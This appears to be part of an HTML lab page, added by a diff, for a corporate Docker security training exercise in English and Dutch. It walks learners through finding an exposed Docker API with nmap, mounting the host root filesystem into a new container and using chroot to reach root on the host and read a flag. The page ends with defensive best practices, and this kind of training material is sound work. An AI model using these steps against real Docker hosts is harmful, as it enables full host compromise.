+            <strong data-lang-key="ch3AnsStep4">Find the first flag</strong>
+            <div class="command-line">cat /root/.secret/flag.txt</div>
+            <div class="terminal-output">FLAG{D0ck3r_Pr1v3sc_Success!}</div>
+          </div>
+        </div>
+        <div class="security-tip">
+          <strong data-lang-key="ch3AnsAchieved">🎯 You've achieved:</strong> <span data-lang-key="ch3AnsResult">Complete root access to the host system through an exposed Docker API!</span>
+        </div>
+        <button class="hint-button" onclick="completeChallenge(3, 40)" data-lang-key="ch3AnsBtn">✅ Host Compromised!</button>
+      </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="challenge-card" id="completion" style="display: none;">
+      <div class="challenge-title" data-lang-key="completionTitle">
+        🏆 Docker Security Lab Complete!
+      </div>
+      <div class="challenge-description">
+        <div class="ing-factory-badge" data-lang-key="completionBadge">Congratulations - You've Mastered Container Security!</div>
+        <br>
+        <strong data-lang-key="completionLearnedTitle">🎓 What you've learned:</strong>
+        <ul>
+          <li data-lang-key="completionLearned1">🔍 How to discover exposed Docker APIs</li>
+          <li data-lang-key="completionLearned2">🏗️ Creating containers via the API</li>
+          <li data-lang-key="completionLearned3">📁 Volume mounting for filesystem access</li>
+          <li data-lang-key="completionLearned4">👑 Container escape using chroot</li>
+          <li data-lang-key="completionLearned5">🚨 The critical importance of securing Docker</li>
+        </ul>
+        <br>
+        <strong data-lang-key="completionBestPracticesTitle">🛡️ Security Best Practices:</strong>
+        <ul>
+          <li data-lang-key="completionBestPractices1">✅ Never expose Docker API without TLS + authentication</li>
+          <li data-lang-key="completionBestPractices2">✅ Use Docker socket proxy with limited permissions</li>
+          <li data-lang-key="completionBestPractices3">✅ Run containers as non-root users when possible</li>
+          <li data-lang-key="completionBestPractices4">✅ Implement network segmentation</li>
+          <li data-lang-key="completionBestPractices5">✅ Regular security audits of Docker configurations</li>
+          <li data-lang-key="completionBestPractices6">✅ Use Docker bench security scanning</li>
+        </ul>
+        <br>
+        <div class="important-note">
+          <strong data-lang-key="completionINGNote">🏭 At ING:</strong> <span data-lang-key="completionINGText">We use secure container orchestration platforms with strict security policies. Always follow the approved deployment procedures and never expose container APIs!</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const translations = {
+        en: {
+            appTitle: "🔐 ING Factory Docker Security Lab",
+            headerTitle: "🐳 Unsecured Docker API Attack Lab",
+            headerSubtitle: "\"Understanding Container Escape and Privilege Escalation\"",
+            progressLabel: "Progress",
+            stepsLabel: "Steps",
+            warningTitle: "⚠️ WARNING: This lab demonstrates REAL security vulnerabilities! ⚠️",
+            warningLine1: "The Docker daemon has been intentionally exposed for educational purposes.",
+            warningLine2: "DO NOT perform these actions on production systems!",
+            objectiveTitle: "🎯 Lab Objective: Learn how an exposed Docker API can lead to complete system compromise.",
+            objectiveDesc: "You'll discover how attackers can abuse Docker to escape containers and gain root access to the host system.",
+            ch0Title: "🚀 Step 0: Understanding the Lab Environment",
+            ch0Start: "START HERE",
+            ch0DescTitle: "What you're learning:",
+            ch0Desc: "How Docker works and why exposed Docker APIs are dangerous.",
+            ch0ScenarioTitle: "The scenario:",
+            ch0Scenario: "A system administrator has accidentally exposed the Docker API to the network without authentication. This is a common misconfiguration that can lead to complete system compromise.",
+            ch0SetupTitle: "🖥️ Your Lab Setup",
+            ch0Host: "🖥️ <strong>Your Machine (Host)</strong> - IP: $host_ip",
+            ch0Api: "↕️ Docker API exposed on port $docker_port ↕️",
+            ch0Kali: "🐳 <strong>Kali Container</strong> - Attack machine: $kali_ip",
+            ch0Target: "🎯 <strong>Target Container</strong> - Web server: $badweb_ip",
+            ch0Hint1Btn: "🤔 What is Docker?",
+            ch0Hint2Btn: "⚠️ Why is this Dangerous?",
+            ch0Hint3Btn: "💻 Connect to Kali",
+            ch0AnswerBtn: "✅ Complete Step",
+            ch0Hint1Title: "🐳 Understanding Docker",
+            ch0Hint1Desc: "Docker is a platform that uses OS-level virtualization to deliver software in packages called containers. Containers are isolated from each other and bundle their own software, libraries and configuration files.",
+            ch0Hint1KeyConcepts: "Key concepts:",
+            ch0Hint1Images: "🏗️ <strong>Images:</strong> Templates used to create containers",
+            ch0Hint1Containers: "📦 <strong>Containers:</strong> Running instances of images",
+            ch0Hint1Api: "🔌 <strong>Docker API:</strong> Interface to control Docker remotely",
+            ch0Hint1Volumes: "🗂️ <strong>Volumes:</strong> Mount host directories into containers",
+            ch0Hint2Title: "⚠️ The Security Risk",
+            ch0Hint2Risk: "When Docker API is exposed without authentication (like in our lab), attackers can:",
+            ch0Hint2Risk1: "🏃 Run any container with any command",
+            ch0Hint2Risk2: "📁 Mount host file system into containers",
+            ch0Hint2Risk3: "👑 Escape containers and gain root access",
+            ch0Hint2Risk4: "🔓 Read any file on the host system",
+            ch0Hint2Risk5: "💣 Deploy malware or cryptominers",
+            ch0Hint2Impact: "Real-world impact:",
+            ch0Hint2Tip: "Thousands of Docker hosts are compromised yearly due to exposed APIs. Attackers often deploy cryptocurrency miners or ransomware.",
+            ch0Hint3Title: "💻 Connecting to Your Attack Machine",
+            ch0Hint3Desc: "First, connect to your Kali Linux container:",
+            ch0Hint3See: "You should see:",
+            ch0AnsConnect: "Connect to Kali container",
+            ch0AnsVerify: "Verify you're in the container",
+            ch0AnsBtn: "✅ I'm Connected!",
+            difficultyBeginner: "BEGINNER",
+            difficultyIntermediate: "INTERMEDIATE",
+            difficultyAdvanced: "ADVANCED",
+            ch1Title: "🔍 Step 1: Discovering the Exposed Docker API",
+            ch1DescTitle: "What you're learning:",
+            ch1Desc: "How to detect exposed Docker APIs on a network.",
+            ch1MissionTitle: "Your mission:",
+            ch1Mission: "Find the exposed Docker API and verify you can access it without authentication.",
+            ch1Hint1Btn: "🔍 Finding Docker APIs",
+            ch1Hint2Btn: "🛠️ Using curl",
+            ch1Hint3Btn: "📋 Docker API Endpoints",
+            ch1AnswerBtn: "✅ Complete Solution",
+            ch1Hint1Title: "🔍 Discovering Docker APIs",
+            ch1Hint1Desc: "Docker typically runs on port 2375 (unencrypted) or 2376 (TLS). In our lab, it's on port $docker_port.",
+            ch1Hint1Methods: "Common discovery methods:",
+            ch1Hint1Method1: "Port scanning with nmap. You can scan for the default Docker ports:<div class=\"command-line\">nmap -p 2375,2376 $host_ip</div>",
+            ch1Hint1Method2: "Shodan searches for exposed Docker",
+            ch1Hint1Method3: "Direct HTTP requests to known ports",
+            ch1Hint2Title: "🔧 Testing with curl",
+            ch1Hint2Desc: "You can test if Docker API is accessible using curl. The host IP is: <code>$host_ip</code>",
+            ch1Hint2Cmd: "Try accessing the version endpoint:",
+            ch1Hint3Title: "📋 Useful Docker API Endpoints",
+            ch1Hint3Desc: "Common endpoints to explore:",
+            ch1Hint3ApiVsCli: "<strong>API vs. CLI:</strong> The `docker` command is a user-friendly client that talks to these API endpoints for you. Using `curl` is like talking directly to the Docker engine's brain—it's how an attacker would script their actions.",
+            ch1Hint3Ep1: "Docker version info",
+            ch1Hint3Ep2: "System information",
+            ch1Hint3Ep3: "List running containers",
+            ch1Hint3Ep4: "List available images",
+            ch1AnsStep1: "Test Docker API access",
+            ch1AnsStep2: "List running containers",
+            ch1AnsStep3: "Get system info",
+            ch1AnsBtn: "✅ API Discovered!",
+            ch2Title: "🏗️ Step 2: Creating a Malicious Container",
+            ch2DescTitle: "What you're learning:",
+            ch2Desc: "How attackers create containers through the exposed API.",
+            ch2MissionTitle: "Your mission:",
+            ch2Mission: "Use the Docker API to create and run a container with elevated privileges.",
+            ch2Hint1Btn: "🎯 Attack Strategy",
+            ch2Hint2Btn: "🔧 API Commands",
+            ch2Hint3Btn: "📦 Creating Container",
+            ch2AnswerBtn: "✅ Complete Solution",
+            ch2Hint1Title: "🎯 The Attack Plan",
+            ch2Hint1Desc: "To escape the container and access the host, we need to:",
+            ch2Hint1Step1: "Create a container using the API",
+            ch2Hint1Step2: "Mount the host's root filesystem (<code>/</code>) into the container",
+            ch2Hint1Step3: "Use <code>chroot</code> to switch to the host's filesystem",
+            ch2Hint1Step4: "Gain root access to the host",
+            ch2Hint1InsightTitle: "Key insight:",
+            ch2Hint1Insight: "When you mount the host's <code>/</code> directory into a container, you can access ALL host files!",
+            ch2Hint2Title: "🔧 Docker API Commands",
+            ch2Hint2Desc: "Creating a container via API requires two steps:",
+            ch2Hint2Step1: "<strong>Create:</strong> POST to <code>/containers/create</code>",
+            ch2Hint2Step2: "<strong>Start:</strong> POST to <code>/containers/{id}/start</code>",
+            ch2Hint2ApiVsCli: "<strong>The Core Difference:</strong> The `docker run` command is a convenient shortcut that performs both the \"create\" and \"start\" API calls in one go. By using `curl`, we are manually performing the raw, individual steps that the Docker client does for us automatically. This is how an attacker would build their exploit.",
+            ch2Hint2Magic: "The magic happens in the container configuration, especially the <code>Volumes</code> binding!",
+            ch2Hint3Title: "📦 Container Creation Payload",
+            ch2Hint3Desc: "Here's the JSON payload structure:",
+            ch2Hint3Critical: "The critical part: <code>\"Binds\": [\"/:/host\"]</code> mounts the entire host filesystem!",
+            ch2AnsStep1: "Create and start the container with host mount",
+            ch2AnsStep2: "Start the container",
+            ch2AnsStep3: "Verify it's running",
+            ch2AnsBtn: "✅ Container Created!",
+            ch3Title: "👑 Step 3: Escaping to Host Root Access",
+            ch3DescTitle: "What you're learning:",
+            ch3Desc: "How to use chroot to escape the container and become root on the host.",
+            ch3MissionTitle: "Your mission:",
+            ch3Mission: "Access your malicious container, use chroot to switch to the host filesystem, and find the secret flag.",
+            ch3Hint1Btn: "🔓 Understanding chroot",
+            ch3Hint2Btn: "🚪 Accessing Container",
+            ch3Hint3Btn: "👑 Privilege Escalation",
+            ch3AnswerBtn: "✅ Complete Solution",
+            ch3Hint1Title: "🔓 Understanding chroot",
+            ch3Hint1Desc: "<code>chroot</code> (change root) changes the apparent root directory for the current process and its children.",
+            ch3Hint1Attack: "In our attack:",
+            ch3Hint1Step1: "The host's filesystem is mounted at <code>/host</code>",
+            ch3Hint1Step2: "We can chroot into <code>/host</code> to access the real filesystem",
+            ch3Hint1Step3: "We'll have root access to the entire host!",
+            ch3Hint1WhyTitle: "Why this works:",
+            ch3Hint1Why: "Docker containers run as root by default. When we mount the host filesystem and chroot, we maintain root privileges!",
+            ch3Hint2Title: "🚪 Accessing Your Evil Container",
+            ch3Hint2Desc: "Exit the Kali container and access your newly created container:",
+            ch3Hint2Now: "You're now in the Alpine container with the host filesystem mounted!",
+            ch3Hint3Title: "👑 The Privilege Escalation",
+            ch3Hint3Desc: "Once inside the container:",
+            ch3Hint3Step1: "Check what's mounted: <code>ls /host</code>",
+            ch3Hint3Step2: "Use chroot to switch to host filesystem",
+            ch3Hint3Step3: "You now have root access to the host!",
+            ch3Hint3Find: "Look for the flag in:",
+            ch3AnsStep1: "Exit Kali and enter the evil container",
+            ch3AnsStep2: "Verify host filesystem is mounted",
+            ch3AnsStep3: "Use chroot to become root on host",
+            ch3AnsStep4: "Find the first flag",
+            ch3AnsAchieved: "🎯 You've achieved:",
+            ch3AnsResult: "Complete root access to the host system through an exposed Docker API!",
+            ch3AnsBtn: "✅ Host Compromised!",
+            completionTitle: "🏆 Docker Security Lab Complete!",
+            completionBadge: "Congratulations - You've Mastered Container Security!",
+            completionLearnedTitle: "🎓 What you've learned:",
+            completionLearned1: "🔍 How to discover exposed Docker APIs",
+            completionLearned2: "🏗️ Creating containers via the API",
+            completionLearned3: "📁 Volume mounting for filesystem access",
+            completionLearned4: "👑 Container escape using chroot",
+            completionLearned5: "🚨 The critical importance of securing Docker",
+            completionBestPracticesTitle: "🛡️ Security Best Practices:",
+            completionBestPractices1: "✅ Never expose Docker API without TLS + authentication",
+            completionBestPractices2: "✅ Use Docker socket proxy with limited permissions",
+            completionBestPractices3: "✅ Run containers as non-root users when possible",
+            completionBestPractices4: "✅ Implement network segmentation",
+            completionBestPractices5: "✅ Regular security audits of Docker configurations",
+            completionBestPractices6: "✅ Use Docker bench security scanning",
+            completionINGNote: "🏭 At ING:",
+            completionINGText: "We use secure container orchestration platforms with strict security policies. Always follow the approved deployment procedures and never expose container APIs!",
+            tabApiCurl: "API (curl)",
+            tabCliDocker: "CLI (docker)",
+            ch2ApiNote: "Note: The API requires two separate steps: create, then start.",
+            ch2ApiCreate: "1. Create the container:",
+            ch2ApiStart: "2. Start the container:",
+            ch2CliNote: "Note: The Docker CLI combines create and start into a single `run` command."
+        },
+        nl: {
+            appTitle: "🔐 ING Factory Docker Security Lab",
+            headerTitle: "🐳 Onbeveiligd Docker API Aanvalslab",
+            headerSubtitle: "\"Container Escape en Privilege Escalation Begrijpen\"",
+            progressLabel: "Voortgang",
+            stepsLabel: "Stappen",
+            warningTitle: "⚠️ WAARSCHUWING: Dit lab demonstreert ECHTE beveiligingslekken! ⚠️",
+            warningLine1: "De Docker-daemon is opzettelijk blootgesteld voor educatieve doeleinden.",
+            warningLine2: "Voer deze acties NIET uit op productiesystemen!",
+            objectiveTitle: "🎯 Lab Doel: Leer hoe een blootgestelde Docker API kan leiden tot volledige systeemcompromittering.",
+            objectiveDesc: "Je zult ontdekken hoe aanvallers Docker kunnen misbruiken om uit containers te ontsnappen en root-toegang tot het hostsysteem te krijgen.",
+            ch0Title: "🚀 Stap 0: De Labomgeving Begrijpen",
+            ch0Start: "START HIER",
+            ch0DescTitle: "Wat je leert:",
+            ch0Desc: "Hoe Docker werkt en waarom blootgestelde Docker API's gevaarlijk zijn.",
+            ch0ScenarioTitle: "Het scenario:",
+            ch0Scenario: "Een systeembeheerder heeft per ongeluk de Docker API zonder authenticatie aan het netwerk blootgesteld. Dit is een veelvoorkomende misconfiguratie die kan leiden tot volledige systeemcompromittering.",
+            ch0SetupTitle: "🖥️ Jouw Labopstelling",
+            ch0Host: "🖥️ <strong>Jouw Machine (Host)</strong> - IP: $host_ip",
+            ch0Api: "↕️ Docker API blootgesteld op poort $docker_port ↕️",
+            ch0Kali: "🐳 <strong>Kali Container</strong> - Aanvalsmachine: $kali_ip",
+            ch0Target: "🎯 <strong>Doel Container</strong> - Webserver: $badweb_ip",
+            ch0Hint1Btn: "🤔 Wat is Docker?",
+            ch0Hint2Btn: "⚠️ Waarom is dit Gevaarlijk?",
+            ch0Hint3Btn: "💻 Verbind met Kali",
+            ch0AnswerBtn: "✅ Stap Voltooien",
+            ch0Hint1Title: "🐳 Docker Begrijpen",
+            ch0Hint1Desc: "Docker is een platform dat OS-level virtualisatie gebruikt om software te leveren in pakketten genaamd containers. Containers zijn van elkaar geïsoleerd en bundelen hun eigen software, bibliotheken en configuratiebestanden.",
+            ch0Hint1KeyConcepts: "Kernbegrippen:",
+            ch0Hint1Images: "🏗️ <strong>Images:</strong> Sjablonen die worden gebruikt om containers te maken",
+            ch0Hint1Containers: "📦 <strong>Containers:</strong> Draaiende instanties van images",
+            ch0Hint1Api: "🔌 <strong>Docker API:</strong> Interface om Docker op afstand te bedienen",
+            ch0Hint1Volumes: "🗂️ <strong>Volumes:</strong> Koppel host-mappen in containers",
+            ch0Hint2Title: "⚠️ Het Veiligheidsrisico",
+            ch0Hint2Risk: "Wanneer de Docker API zonder authenticatie wordt blootgesteld (zoals in ons lab), kunnen aanvallers:",
+            ch0Hint2Risk1: "🏃 Elke container met elk commando uitvoeren",
+            ch0Hint2Risk2: "📁 Het bestandssysteem van de host in containers koppelen",
+            ch0Hint2Risk3: "👑 Ontsnappen uit containers en root-toegang krijgen",
+            ch0Hint2Risk4: "🔓 Elk bestand op het hostsysteem lezen",
+            ch0Hint2Risk5: "💣 Malware of cryptominers implementeren",
+            ch0Hint2Impact: "Impact in de praktijk:",
+            ch0Hint2Tip: "Duizenden Docker-hosts worden jaarlijks gecompromitteerd door blootgestelde API's. Aanvallers implementeren vaak cryptovaluta-miners of ransomware.",
+            ch0Hint3Title: "💻 Verbinden met je Aanvalsmachine",
+            ch0Hint3Desc: "Maak eerst verbinding met je Kali Linux-container:",
+            ch0Hint3See: "Je zou moeten zien:",
+            ch0AnsConnect: "Verbind met Kali-container",
+            ch0AnsVerify: "Controleer of je in de container bent",
+            ch0AnsBtn: "✅ Ik ben Verbonden!",
+            difficultyBeginner: "BEGINNER",
+            difficultyIntermediate: "GEMIDDELD",
+            difficultyAdvanced: "GEAVANCEERD",
+            ch1Title: "🔍 Stap 1: De Blootgestelde Docker API Ontdekken",
+            ch1DescTitle: "Wat je leert:",
+            ch1Desc: "Hoe je blootgestelde Docker API's op een netwerk kunt detecteren.",
+            ch1MissionTitle: "Jouw missie:",
+            ch1Mission: "Vind de blootgestelde Docker API en verifieer dat je er zonder authenticatie toegang toe hebt.",
+            ch1Hint1Btn: "🔍 Docker API's Vinden",
+            ch1Hint2Btn: "🛠️ curl Gebruiken",
+            ch1Hint3Btn: "📋 Docker API Endpoints",
+            ch1AnswerBtn: "✅ Volledige Oplossing",
+            ch1Hint1Title: "🔍 Docker API's Ontdekken",
+            ch1Hint1Desc: "Docker draait doorgaans op poort 2375 (onversleuteld) of 2376 (TLS). In ons lab is het op poort $docker_port.",
+            ch1Hint1Methods: "Veelgebruikte ontdekkingsmethoden:",
+            ch1Hint1Method1: "Poortscannen met nmap. U kunt scannen op de standaard Docker-poorten:<div class=\"command-line\">nmap -p 2375,2376 $host_ip</div>",
+            ch1Hint1Method2: "Shodan-zoekopdrachten voor blootgestelde Docker",
+            ch1Hint1Method3: "Directe HTTP-verzoeken naar bekende poorten",
+            ch1Hint2Title: "🔧 Testen met curl",
+            ch1Hint2Desc: "Je kunt testen of de Docker API toegankelijk is met curl. Het IP-adres van de host is: <code>$host_ip</code>",
+            ch1Hint2Cmd: "Probeer toegang te krijgen tot het versie-eindpunt:",
+            ch1Hint3Title: "📋 Nuttige Docker API Endpoints",
+            ch1Hint3Desc: "Veelgebruikte eindpunten om te verkennen:",
+            ch1Hint3ApiVsCli: "<strong>API vs. CLI:</strong> Het `docker`-commando is een gebruiksvriendelijke client die voor u met deze API-eindpunten praat. Het gebruik van `curl` is als rechtstreeks praten met het brein van de Docker-engine - zo zou een aanvaller zijn acties scripten.",
+            ch1Hint3Ep1: "Docker versie-info",
+            ch1Hint3Ep2: "Systeeminformatie",
+            ch1Hint3Ep3: "Lijst van draaiende containers",
+            ch1Hint3Ep4: "Lijst van beschikbare images",
+            ch1AnsStep1: "Test Docker API-toegang",
+            ch1AnsStep2: "Lijst draaiende containers",
+            ch1AnsStep3: "Krijg systeeminformatie",
+            ch1AnsBtn: "✅ API Ontdekt!",
+            ch2Title: "🏗️ Stap 2: Een Kwaadaardige Container Maken",
+            ch2DescTitle: "Wat je leert:",
+            ch2Desc: "Hoe aanvallers containers maken via de blootgestelde API.",
+            ch2MissionTitle: "Jouw missie:",
+            ch2Mission: "Gebruik de Docker API om een container met verhoogde privileges te maken en uit te voeren.",
+            ch2Hint1Btn: "🎯 Aanvalsstrategie",
+            ch2Hint2Btn: "🔧 API-commando's",
+            ch2Hint3Btn: "📦 Container Maken",
+            ch2AnswerBtn: "✅ Volledige Oplossing",
+            ch2Hint1Title: "🎯 Het Aanvalsplan",
+            ch2Hint1Desc: "Om uit de container te ontsnappen en toegang te krijgen tot de host, moeten we:",
+            ch2Hint1Step1: "Een container maken met de API",
+            ch2Hint1Step2: "Het root-bestandssysteem van de host (<code>/</code>) in de container koppelen",
+            ch2Hint1Step3: "<code>chroot</code> gebruiken om over te schakelen naar het bestandssysteem van de host",
+            ch2Hint1Step4: "Root-toegang tot de host verkrijgen",
+            ch2Hint1InsightTitle: "Belangrijk inzicht:",
+            ch2Hint1Insight: "Wanneer je de <code>/</code> map van de host in een container koppelt, heb je toegang tot ALLE hostbestanden!",
+            ch2Hint2Title: "🔧 Docker API-commando's",
+            ch2Hint2Desc: "Een container maken via de API vereist twee stappen:",
+            ch2Hint2Step1: "<strong>Maken:</strong> POST naar <code>/containers/create</code>",
+            ch2Hint2Step2: "<strong>Starten:</strong> POST naar <code>/containers/{id}/start</code>",
+            ch2Hint2ApiVsCli: "<strong>Het Kernverschil:</strong> Het `docker run`-commando is een handige snelkoppeling die zowel de \"create\" als de \"start\" API-aanroepen in één keer uitvoert. Door `curl` te gebruiken, voeren we handmatig de onbewerkte, individuele stappen uit die de Docker-client automatisch voor ons doet. Zo zou een aanvaller zijn exploit bouwen.",
+            ch2Hint2Magic: "De magie gebeurt in de containerconfiguratie, met name de <code>Volumes</code>-binding!",
+            ch2Hint3Title: "📦 Container Creatie Payload",
+            ch2Hint3Desc: "Hier is de JSON-payloadstructuur:",
+            ch2Hint3Critical: "Het kritieke deel: <code>\"Binds\": [\"/:/host\"]</code> koppelt het volledige host-bestandssysteem!",
+            ch2AnsStep1: "Maak en start de container met host-koppeling",
+            ch2AnsStep2: "Start de container",
+            ch2AnsStep3: "Controleer of hij draait",
+            ch2AnsBtn: "✅ Container Gemaakt!",
+            ch3Title: "👑 Stap 3: Ontsnappen naar Host Root-toegang",
+            ch3DescTitle: "Wat je leert:",
+            ch3Desc: "Hoe je chroot gebruikt om uit de container te ontsnappen en root te worden op de host.",
+            ch3MissionTitle: "Jouw missie:",
+            ch3Mission: "Krijg toegang tot je kwaadaardige container, gebruik chroot om over te schakelen naar het host-bestandssysteem en vind de geheime vlag.",
+            ch3Hint1Btn: "🔓 chroot Begrijpen",
+            ch3Hint2Btn: "🚪 Toegang tot Container",
+            ch3Hint3Btn: "👑 Privilege Escalation",
+            ch3AnswerBtn: "✅ Volledige Oplossing",
+            ch3Hint1Title: "🔓 chroot Begrijpen",
+            ch3Hint1Desc: "<code>chroot</code> (change root) verandert de schijnbare rootmap voor het huidige proces en zijn kinderen.",
+            ch3Hint1Attack: "In onze aanval:",
+            ch3Hint1Step1: "Het bestandssysteem van de host is gekoppeld aan <code>/host</code>",
+            ch3Hint1Step2: "We kunnen chrooten naar <code>/host</code> om toegang te krijgen tot het echte bestandssysteem",
+            ch3Hint1Step3: "We hebben dan root-toegang tot de hele host!",
+            ch3Hint1WhyTitle: "Waarom dit werkt:",
+            ch3Hint1Why: "Docker-containers draaien standaard als root. Wanneer we het host-bestandssysteem koppelen en chrooten, behouden we de root-rechten!",
+            ch3Hint2Title: "🚪 Toegang tot Je Kwaadaardige Container",
+            ch3Hint2Desc: "Verlaat de Kali-container en krijg toegang tot je nieuw gemaakte container:",
+            ch3Hint2Now: "Je bent nu in de Alpine-container met het host-bestandssysteem gekoppeld!",
+            ch3Hint3Title: "👑 De Privilege Escalation",
+            ch3Hint3Desc: "Eenmaal in de container:",
+            ch3Hint3Step1: "Controleer wat er is gekoppeld: <code>ls /host</code>",
+            ch3Hint3Step2: "Gebruik chroot om over te schakelen naar het host-bestandssysteem",
+            ch3Hint3Step3: "Je hebt nu root-toegang tot de host!",
+            ch3Hint3Find: "Zoek naar de vlag in:",
+            ch3AnsStep1: "Verlaat Kali en ga de kwaadaardige container binnen",
+            ch3AnsStep2: "Controleer of het host-bestandssysteem is gekoppeld",
+            ch3AnsStep3: "Gebruik chroot om root te worden op de host",
+            ch3AnsStep4: "Vind de eerste vlag",
+            ch3AnsAchieved: "🎯 Je hebt bereikt:",
+            ch3AnsResult: "Volledige root-toegang tot het hostsysteem via een blootgestelde Docker API!",
+            ch3AnsBtn: "✅ Host Gecompromitteerd!",
+            completionTitle: "🏆 Docker Security Lab Voltooid!",
+            completionBadge: "Gefeliciteerd - Je hebt Containerbeveiliging onder de knie!",
+            completionLearnedTitle: "🎓 Wat je hebt geleerd:",
+            completionLearned1: "🔍 Hoe je blootgestelde Docker API's kunt ontdekken",
+            completionLearned2: "🏗️ Containers maken via de API",
+            completionLearned3: "📁 Volume-koppeling voor bestandssysteemtoegang",
+            completionLearned4: "👑 Container-ontsnapping met chroot",
+            completionLearned5: "🚨 Het cruciale belang van het beveiligen van Docker",
+            completionBestPracticesTitle: "🛡️ Beveiligings-Best Practices:",
+            completionBestPractices1: "✅ Stel de Docker API nooit bloot zonder TLS + authenticatie",
+            completionBestPractices2: "✅ Gebruik een Docker-socketproxy met beperkte rechten",
+            completionBestPractices3: "✅ Draai containers indien mogelijk als niet-root gebruikers",
+            completionBestPractices4: "✅ Implementeer netwerksegmentatie",
+            completionBestPractices5: "✅ Regelmatige beveiligingsaudits van Docker-configuraties",
+            completionBestPractices6: "✅ Gebruik Docker bench security scanning",
+            completionINGNote: "🏭 Bij ING:",
+            completionINGText: "We gebruiken veilige container-orkestratieplatforms met strikte beveiligingsbeleidsregels. Volg altijd de goedgekeurde implementatieprocedures en stel container-API's nooit bloot!",
+            tabApiCurl: "API (curl)",
+            tabCliDocker: "CLI (docker)",
+            ch2ApiNote: "Let op: De API vereist twee afzonderlijke stappen: aanmaken en vervolgens starten.",
+            ch2ApiCreate: "1. Maak de container aan:",
+            ch2ApiStart: "2. Start de container:",
+            ch2CliNote: "Let op: De Docker CLI combineert aanmaken en starten in één `run` commando."
+        }
+    };
+
+    let totalScore = 0;
+    let completedChallengesCount = 0;
+    const totalChallenges = 4;
+    const challengeCompletionStatus = [false, false, false, false];
+
+    function toggleHint(hintId, buttonElement) {
+      const hint = document.getElementById(hintId);
+      if (!hint) return;
+
+      const isVisible = hint.style.display === 'block';
+      hint.style.display = isVisible ? 'none' : 'block';
+
+      if (!isVisible) {
+        hint.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }
+    }
+
+    function toggleAnswer(answerId, buttonElement) {
+      const answer = document.getElementById(answerId);
+      if (!answer) return;
+
+      const isVisible = answer.style.display === 'block';
+      answer.style.display = isVisible ? 'none' : 'block';
+      
+      if (!isVisible) {
+        answer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }
+    }
+
+    function completeChallenge(challengeId, points) {
+      if (challengeCompletionStatus[challengeId]) {
+        return;
+      }
+
+      challengeCompletionStatus[challengeId] = true;
+      const challengeCard = document.getElementById(`challenge${challengeId}`);
+      if (challengeCard) {
+        challengeCard.classList.add('completed');
+        const button = challengeCard.querySelector(`.answer-content .hint-button`);
+        if (button) button.disabled = true;
+      }
+
+      totalScore += points;
+      completedChallengesCount++;
+      updateProgressUI();
+    }
+
+    function updateProgressUI() {
+      document.getElementById('score').textContent = totalScore;
+      document.getElementById('completed').textContent = completedChallengesCount;
+
+      const progressPercentage = (totalScore / 100) * 100;
+      document.getElementById('progressBar').style.width = `${progressPercentage}%`;
+      
+      if (completedChallengesCount === totalChallenges) {
+        const completionEl = document.getElementById('completion');
+        if(completionEl) {
+          completionEl.style.display = 'block';
+          completionEl.scrollIntoView({ behavior: 'smooth' });
+        }
+      }
+    }
+
+    /**
+     * Handles copying text from a code block to the clipboard.
+     * @param {HTMLElement} button The button element that was clicked.
+     */
+    function copyCode(button) {
+        const codeBlock = button.parentElement;
+        const clone = codeBlock.cloneNode(true);
+        const buttonInClone = clone.querySelector('.copy-button');
+        if (buttonInClone) {
+            buttonInClone.remove();
+        }
+        
+        const textToCopy = clone.innerText.trim();
+        const textArea = document.createElement("textarea");
+        textArea.value = textToCopy;
+        
+        textArea.style.position = "fixed";
+        textArea.style.top = "-9999px";
+        textArea.style.left = "-9999px";
+        
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+
+        try {
+            document.execCommand('copy');
+            button.textContent = 'Copied!';
+            button.classList.add('copied');
+            setTimeout(() => {
+                button.textContent = 'Copy';
+                button.classList.remove('copied');
+            }, 2000);
+        } catch (err) {
+            console.error('Failed to copy text.', err);
+            button.textContent = 'Error';
+            setTimeout(() => {
+                button.textContent = 'Copy';
+            }, 2000);
+        }
+
+        document.body.removeChild(textArea);
+    }
+
+    /**
+     * Finds all code blocks on the page and adds a copy button to them.
+     */
+    function initializeCopyButtons() {
+        const codeBlocks = document.querySelectorAll('.command-line, .terminal-output');
+        codeBlocks.forEach(block => {
+            // Use textContent to correctly check for content even in hidden elements
+            if (block.textContent.trim() === '') {
+                return;
+            }
+
+            const button = document.createElement('button');
+            button.className = 'copy-button';
+            button.textContent = 'Copy';
+            button.setAttribute('aria-label', 'Copy code to clipboard');
+            button.onclick = () => copyCode(button);
+            block.appendChild(button);
+        });
+    }
+
+    /**
+     * Sets the language of the page content.
+     * @param {string} lang The language to switch to ('en' or 'nl').
+     */
+    function setLanguage(lang) {
+        document.querySelectorAll('[data-lang-key]').forEach(elem => {
+            const key = elem.dataset.langKey;
+            if (translations[lang] && translations[lang][key]) {
+                elem.innerHTML = translations[lang][key];
+            }
+        });
+
+        // Update active button style
+        document.getElementById('lang-en').classList.toggle('active', lang === 'en');
+        document.getElementById('lang-nl').classList.toggle('active', lang === 'nl');
+    }
+
+    /**
+     * Shows the selected tab in a tab container.
+     * @param {HTMLElement} btn The button element that was clicked.
+     * @param {string} tabId The ID of the tab content to show.
+     */
+    function showTab(btn, tabId) {
+        const tabContainer = btn.closest('.command-tabs');
+        
+        // Deactivate all buttons and content in this container
+        tabContainer.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        tabContainer.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+        // Activate the clicked button and corresponding content
+        btn.classList.add('active');
+        document.getElementById(tabId).classList.add('active');
+    }
+
+    // Add event listeners for language switcher
+    document.getElementById('lang-en').addEventListener('click', () => setLanguage('en'));
+    document.getElementById('lang-nl').addEventListener('click', () => setLanguage('nl'));
+
+    // Run initialization functions after the page has loaded
+    window.addEventListener('load', () => {
+        initializeCopyButtons();
+        setLanguage('en'); // Set default language to English
+    });
+  </script>
+</body>
+</html>
+
